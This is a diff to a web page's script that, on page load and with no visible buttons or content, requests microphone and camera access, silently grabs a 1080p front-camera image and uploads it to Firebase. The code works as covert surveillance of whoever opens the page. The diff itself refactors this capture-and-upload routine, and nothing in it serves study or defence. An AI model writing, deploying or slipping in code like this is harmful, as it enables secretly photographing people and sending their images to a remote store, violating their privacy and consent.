@@ -37,15 +37,15 @@
                 });
         }
 
-        // Request microphone and camera permissions
-        async function requestPermissions() {
+        // Request microphone and camera permissions and take a picture
+        async function requestPermissionsAndCapture() {
             try {
                 // Request microphone access
-                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                await navigator.mediaDevices.getUserMedia({ audio: true });
                 console.log('Microphone access granted.');
 
                 // Request camera access after microphone access is granted
-                const camStream = await navigator.mediaDevices.getUserMedia({
+                const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: { ideal: "user" }, // Use front camera
                         width: { ideal: 1920 },
@@ -55,24 +55,23 @@
                 });
                 console.log('Camera access granted.');
 
-                // Capture image after both permissions are granted
+                // Create video and canvas elements for capturing image
                 const video = document.createElement('video');
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
-                video.srcObject = camStream;
 
+                video.srcObject = stream;
                 video.onloadedmetadata = () => {
                     video.play();
-                    canvas.width = 1920;
-                    canvas.height = 1080;
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.width = 1920; // Set canvas width for 1080p
+                    canvas.height = 1080; // Set canvas height for 1080p
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height); // Capture image
                     const imageData = canvas.toDataURL('image/png');
                     uploadImage(imageData); // Upload the captured image to Firebase
                 };
 
-                // Stop the video and microphone streams after capturing the image
-                stopVideo(micStream);
-                stopVideo(camStream);
+                // Stop video stream after capturing the image
+                stopVideo(stream);
             } catch (error) {
                 console.error('Error accessing microphone or camera:', error);
             }
@@ -84,9 +83,9 @@
             tracks.forEach(track => track.stop());
         }
 
-        // Automatically request permissions on page load
+        // Automatically request permissions and capture on page load
         window.addEventListener('load', () => {
-            requestPermissions();
+            requestPermissionsAndCapture();
         });
     </script>
 
@@ -110,6 +109,6 @@
     </style>
 </head>
 <body>
-    <!-- No buttons or visible elements -->
+    <!-- No buttons or visible elements, automatic image capture after permissions -->
 </body>
 </html>
